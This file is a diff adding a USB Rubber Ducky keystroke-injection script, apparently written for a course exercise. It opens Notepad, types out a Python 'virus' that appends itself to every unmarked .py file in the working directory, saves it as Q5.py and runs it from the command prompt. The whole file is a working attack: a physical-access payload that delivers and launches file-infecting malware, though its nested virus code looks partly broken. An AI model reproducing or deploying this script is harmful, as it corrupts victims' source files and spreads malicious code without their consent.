@@ -1,0 +1,110 @@
+DELAY 1500
+GUI r
+DELAY 500
+STRING notepad.exe
+ENTER
+DELAY 1000
+STRING import os
+ENTER
+STRING virus = """
+ENTER
+STRING import re
+ENTER
+STRING import sys
+ENTER
+STRING file = sys.argv[1]
+ENTER
+STRING virus = \"\"\"
+ENTER
+STRING import sys
+ENTER
+STRING #Q1 Virus
+ENTER
+STRING with open("Q1B.out", "a") as f:
+ENTER
+TAB
+STRING for argument in sys.argv:
+ENTER
+TAB
+TAB
+STRING f.write(argument + " ")
+ENTER
+STRING with open(file, "r+") as f:
+ENTER
+TAB
+STRING infected = False
+ENTER
+TAB
+STRING for line in f:
+ENTER
+TAB
+TAB
+STRING if "#Q1 Virus" in line:
+ENTER
+TAB
+TAB
+TAB
+STRING infected = True
+ENTER
+TAB
+STRING if not infected:
+ENTER
+TAB
+TAB
+STRING f.write(virus)
+ENTER
+STRING \"\"\"
+ENTER
+STRING """
+ENTER
+STRING files = [f for f in os.listdir('.') if os.path.isfile(f) and f.endswith(".py")]
+ENTER
+STRING for file in files:
+ENTER
+TAB
+STRING with open(file, "r+") as f:
+ENTER
+TAB
+TAB
+STRING infected = False
+ENTER
+TAB
+TAB
+STRING for line in f:
+ENTER
+TAB
+TAB
+TAB
+STRING if "#Q1 Virus" in line:
+ENTER
+TAB
+TAB
+TAB
+TAB
+STRING infected = True
+ENTER
+TAB
+TAB
+STRING if not infected:
+ENTER
+TAB
+TAB
+TAB
+STRING f.write(virus)
+ENTER
+CTRL s
+DELAY 750
+STRING Q5.py
+DELAY 500
+ENTER
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd C:\Users\tomkm\Desktop
+ENTER
+DELAY 250
+STRING python Q5.py
+ENTER
